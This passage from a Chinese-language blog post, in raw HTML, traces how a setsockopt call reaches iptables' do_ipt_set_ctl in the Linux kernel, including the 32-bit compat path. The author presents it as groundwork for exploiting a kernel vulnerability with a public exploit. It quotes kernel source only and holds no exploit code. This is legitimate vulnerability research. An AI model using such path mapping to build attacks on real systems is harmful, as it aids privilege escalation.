class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的 <code>sock_common_setsockopt</code>，他又会调用到 <code>sk-&gt;sk_prot-&gt;setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_common_setsockopt);</span><br></pre></td></tr></table></figure><p>又绕回前面，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>tcp_setsockopt()</code>，在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">char</span> __user *optval,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcp_setsockopt);</span><br></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 socket 中 sock 结构体的初始化过程，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最后应该调用到 <code>ip_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br></pre></td></tr></table></figure><p>在  <code>ip_setsockopt</code> 中最终调用到 <code>nf_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level,</span></span><br><span class="line"><span class="params"><span class="type">int</span> optname, <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_IP)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">err = do_ip_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span></span><br><span class="line"><span class="keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;</span><br><span class="line">    optname &lt; BPFILTER_IPT_SET_MAX)</span><br><span class="line">err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(ip_setsockopt);</span><br></pre></td></tr></table></figure><p>而 setsockopt 与 getsockopt 其实都整合到了 <code>nf_sockopt()</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call get/setsockopt() */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">      <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get)</span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val, <span class="type">char</span> __user *opt,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_setsockopt);</span><br></pre></td></tr></table></figure><p>这里我们看出其通过 <code>nf_sockopt_find</code> 找到对应的函数表从而调用其对应的函数，这里 setsockopt 对应调用到的应该是 <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>为什么是这个函数？这里我们回到 <code>nf_sockopt_find</code> 中，其使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="32-位下的-setsockopt-系统调用"><a href="#32-位下的-setsockopt-系统调用" class="headerlink" title="32 位下的 setsockopt 系统调用"></a>32 位下的 setsockopt 系统调用</h2><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在设置了 <code>CONFIG_COMPAT=y</code> 的情况下（意为兼容 32 位，默认开启），32位程序进行系统调用时<strong>实际上是通过 COMPAT_SYSCALL_DEFINE 宏定义的兼容 32 位系统调用完成的</strong></p><blockquote><p>我们知道 32 位程序通过 0x80 号中断进行系统调用，而 64 位程序则通过 syscall 指令完成系统调用，因此在64位内核中将 0x80 号中断专门用作兼容 32 位进程的系统调用入口</p></blockquote><p>因此当一个 32 位程序进行 setsockopt 系统调用时，最终会调用到 <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="type">int</span>, fd, <span class="type">int</span>, level, <span class="type">int</span>, optname,</span><br><span class="line">       <span class="type">char</span> __user *, optval, <span class="type">unsigned</span> <span class="type">int</span>, optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其实 glibc 中的 setsockopt 的 wrapper 是通过 <code>socketcall</code> 这一系统调用进行的，实际上在很久以前该系统调用其实是 socket 相关系统调用的唯一入口点，后面各种子功能拆分成了多个系统调用，但是该系统调用仍然保留了下来，因此对于同一个功能，即可以走 socketcall 系统调用，也可以走拆分出来的那个系统调用，最后的路径是相同的</p></blockquote><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，故在 <code>__compat_sys_setsockopt()</code>中最终会走到 <code>sock-&gt;ops-&gt;compat_setsockopt</code> 或 <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __compat_sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock = sockfd_lookup(fd, &amp;err);</span><br><span class="line"><span class="keyword">if</span> (sock) &#123;</span><br><span class="line">err = security_socket_setsockopt(sock, level, optname);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">sockfd_put(sock);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err = compat_sock_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)</span><br><span class="line">err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err = sock-&gt;ops-&gt;setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line">sockfd_put(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该走入哪条路径？那么这里我们需要先看创建该函数表的过程，这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight 